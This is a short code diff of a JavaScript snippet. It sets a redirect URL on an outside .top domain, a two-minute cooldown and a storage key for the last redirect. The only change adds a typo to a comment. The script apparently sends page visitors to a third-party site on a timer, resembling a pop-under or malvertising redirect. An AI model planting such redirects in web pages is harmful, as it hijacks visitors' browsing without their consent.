@@ -1,6 +1,6 @@
 (function () {
   const REDIRECT_URL = "https://whoushex.top/4/9122239";
-  const COOLDOWN_TIME = 2 * 60 * 1000; // 2 minutes in milliseconds
+  const COOLDOWN_TIME = 2 * 60 * 1000; // 2 minutes in millisecondsa
   const STORAGE_KEY = "lastRedirectTimestamp";
 
   const now = Date.now();
